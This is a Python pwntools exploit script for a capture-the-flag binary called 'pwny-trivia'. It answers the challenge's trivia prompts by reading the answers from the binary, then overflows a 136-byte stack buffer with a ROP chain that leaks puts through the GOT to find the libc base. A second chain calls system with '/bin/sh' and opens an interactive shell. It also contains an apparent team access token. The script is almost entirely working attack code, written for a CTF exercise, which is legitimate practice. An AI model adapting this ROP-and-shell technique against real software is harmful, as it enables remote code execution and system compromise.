#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("libc6_2.35-0ubuntu3.8_amd64.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("pwny-trivia.challs.snakectf.org", 1337, ssl = True)
        r.sendlineafter(b"token: ", b"921965abb6e1f8ea06bf2c88a9aead76")        # Send team's token to access chall

    return r


def send_answer(answer: bytes):
    r.sendlineafter(b"> ", answer)
    r.sendlineafter(b"(y/n) ", b"y")
    r.recvline()        # Read garbage


def main():
    r = conn()
    rop = ROP(exe)

    pop_regs = rop.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]
    dummy_ret = rop.find_gadget(['ret'])[0]

    r.recvlines(4)      # Read garbage

    for _ in range(5):
        question = r.recvuntil(b" (answer max 100 chars)", drop = True)
        question_addr = next(exe.search(question))
        answer_addr = question_addr + 0x64
        answer = exe.read(answer_addr, 0x30).strip(b"\x00")     # Max length 0x30 (??)
        send_answer(answer)

    payload = flat(
        b"A" * 136,     # Padding
        p64(pop_regs),
        p64(exe.got["puts"]),
        p64(0x0),
        p64(0x0),
        p64(exe.plt["puts"]),
        p64(exe.symbols["play"])
    )

    r.sendlineafter(b"money: ", payload)
    r.recvuntil(b"XD Aha! Just kidding, no money here XD", drop = True)
    
    leak = r.recvline().strip(b'\n')
    leak = int.from_bytes(leak, byteorder = 'little')
    libc.address = leak - libc.symbols["puts"]
    log.info(f"LIBC 0x{libc.address:x}")

    r.recvlines(2)      # Read garbage

    for _ in range(5):
        question = r.recvuntil(b" (answer max 100 chars)", drop = True)
        question_addr = next(exe.search(question))
        answer_addr = question_addr + 0x64
        answer = exe.read(answer_addr, 0x30).strip(b"\x00")     # Max length 0x30 (??)
        send_answer(answer)

    payload = flat(
        b"A" * 136,     # Padding
        p64(pop_regs),
        p64(next(libc.search(b"/bin/sh\x00"))),
        p64(0x0),
        p64(0x0),
        p64(dummy_ret),
        p64(libc.symbols["system"])
    )

    r.sendline(payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
